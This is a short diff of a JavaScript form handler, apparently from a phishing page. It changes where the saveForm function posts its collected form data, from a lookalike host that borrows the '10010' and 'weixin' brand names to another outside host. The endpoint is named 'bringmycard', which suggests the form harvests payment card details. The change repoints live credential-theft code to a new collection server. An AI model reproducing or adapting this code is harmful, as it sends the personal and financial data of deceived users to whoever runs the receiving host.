@@ -173,7 +173,7 @@ function saveForm() {
 
         type: 'post',
 
-        url: "http://10010.com.weixin.cloudns.asia:10010/bringmycard",
+        url: "https://coniy.5sz.net/bringmycard",
 
         data:  datas ,
 
